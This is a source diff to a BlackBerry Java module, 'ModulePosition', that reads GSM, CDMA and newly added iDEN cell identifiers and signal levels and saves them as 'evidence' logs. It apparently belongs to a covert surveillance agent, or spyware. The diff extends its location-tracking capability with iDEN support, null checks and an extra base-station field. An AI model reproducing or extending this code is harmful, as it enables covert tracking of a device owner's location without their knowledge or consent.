@@ -21,6 +21,8 @@ import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
+import net.rim.device.api.system.IDENInfo;
+import net.rim.device.api.system.IDENInfo.IDENCellInfo;
 import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.WLANInfo;
 import net.rim.device.api.system.WLANInfo.WLANAPInfo;
@@ -185,6 +187,9 @@ public final class ModulePosition extends BaseInstantModule implements
     private Timer timer;
     private boolean waitingForPoint;
 
+    /**
+     * http://supportforums.blackberry.com/t5/tkb/articleprintpage/tkb-id/java_dev@tkb/article-id/479
+     */
     private void locationGPS() {
         //#ifdef DEBUG
         debug.trace("locationGPS"); //$NON-NLS-1$
@@ -292,6 +297,12 @@ public final class ModulePosition extends BaseInstantModule implements
             // http://en.wikipedia.org/wiki/Mobile_country_code
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("locationCELL: null cellinfo");
+                return;
+                //#endif
+            }
 
             //#ifdef DEBUG
             debug.trace(Messages.getString("16.11") + cellinfo.getMCC() + "/" //$NON-NLS-1$ //$NON-NLS-2$
@@ -316,17 +327,17 @@ public final class ModulePosition extends BaseInstantModule implements
             //final int rssi = cellinfo.getRSSI();
             final int rssi = RadioInfo.getSignalLevel();
 
-            final StringBuffer mb = new StringBuffer();
-            mb.append(Messages.getString("16.4") + mcc); //$NON-NLS-1$
-            mb.append(Messages.getString("16.5") + mnc); //$NON-NLS-1$
-            mb.append(Messages.getString("16.6") + lac); //$NON-NLS-1$
-            mb.append(Messages.getString("16.7") + cid); //$NON-NLS-1$
             //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" MCC:" + mcc); //$NON-NLS-1$
+            mb.append(" MNC:" + mnc); //$NON-NLS-1$
+            mb.append(" LAC:" + lac); //$NON-NLS-1$
+            mb.append(" CID:" + cid); //$NON-NLS-1$
             debug.info(mb.toString());
             //#endif
 
             if (mcc != 0) {
-                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, 0, rssi);
 
                 if (payload != null) {
                     logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
@@ -337,6 +348,13 @@ public final class ModulePosition extends BaseInstantModule implements
 
         } else if (Device.isCDMA()) {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("locationCELL: null cellinfo");
+                return;
+                //#endif
+            }
+
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
             final int nid = cellinfo.getNID();
@@ -347,26 +365,77 @@ public final class ModulePosition extends BaseInstantModule implements
 
             final int rssi = RadioInfo.getSignalLevel();
 
-            final StringBuffer mb = new StringBuffer();
-            mb.append(Messages.getString("16.8") + sid); //$NON-NLS-1$
-            mb.append(Messages.getString("16.9") + nid); //$NON-NLS-1$
-            mb.append(Messages.getString("16.10") + bid); //$NON-NLS-1$
-
             //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" SID:" + sid); //$NON-NLS-1$
+            mb.append(" NID:" + nid); //$NON-NLS-1$
+            mb.append(" BID:" + bid); //$NON-NLS-1$
             debug.info(mb.toString());
             //#endif
 
             if (sid != 0) {
-                final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+                final byte[] payload = getCellPayload(mcc, sid, nid, bid, 0, rssi);
                 logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA));
                 saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
             }
         } else if (Device.isIDEN()) {
-            //TODO IDEN
+
+            // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
+            // CC e MNC possono essere estratti da IMEI
+            // http://en.wikipedia.org/wiki/Mobile_country_code
+            // http://en.wikipedia.org/wiki/Mobile_Network_Code
+            final IDENCellInfo cellinfo = IDENInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("locationCELL: null cellinfo");
+                return;
+                //#endif
+            }
+
             //#ifdef DEBUG
-            debug.error("locationCELL: IDEN not supported"); //$NON-NLS-1$
+            debug.trace(Messages.getString("16.11") + cellinfo.getMCC() + "/" //$NON-NLS-1$ //$NON-NLS-2$
+                    + GPRSInfo.getHomeMCC());
+            /*
+             * Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC=" +
+             * GPRSInfo.getHomeMCC() + " radioninfo=" +
+             * RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()) + " mnc=" +
+             * cellinfo.getMNC() + " radiomnc=" +
+             * RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));
+             */
             //#endif
+
+            int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
+                    .getCurrentNetworkIndex()));
+
+            final int ndc = cellinfo.getNDC();
+            final int said = cellinfo.getSAId();
+            final int llaid = cellinfo.getLLAId();
+            final int cid = cellinfo.getCellId();
+
+            final int rssi = IDENInfo.getSQELevel();
+            //final int rssi = RadioInfo.getSignalLevel();
+
+            //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" MCC:" + mcc); //$NON-NLS-1$
+            mb.append(" NDC:" + ndc); //$NON-NLS-1$
+            mb.append(" SAID:" + said); //$NON-NLS-1$
+            mb.append(" LLAID:" + llaid); //$NON-NLS-1$
+            mb.append(" CID:" + cid); //$NON-NLS-1$
+
+            debug.info(mb.toString());
+            //#endif
+
+            if (mcc != 0) {
+                final byte[] payload = getCellPayload(mcc, ndc, said, cid, llaid, rssi);
+
+                if (payload != null) {
+                    logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
+                    saveEvidence(logCell, payload, LOG_TYPE_GSM);
+                    logCell.close();
+                }
+            }
         } else {
             //#ifdef DEBUG
             debug.error("locationCELL: not supported"); //$NON-NLS-1$
@@ -546,7 +615,7 @@ public final class ModulePosition extends BaseInstantModule implements
         return payload;
     }
 
-    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {
+    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int bsid, int rssi) {
 
         final int size = 19 * 4 + 48 + 16;
         final byte[] cellPosition = new byte[size];
@@ -562,7 +631,7 @@ public final class ModulePosition extends BaseInstantModule implements
         databuffer.writeInt(lac); //
         databuffer.writeInt(cid); //
 
-        databuffer.writeInt(0); // bsid
+        databuffer.writeInt(bsid); // bsid
         databuffer.writeInt(0); // bcc
 
         databuffer.writeInt(rssi); // rx level
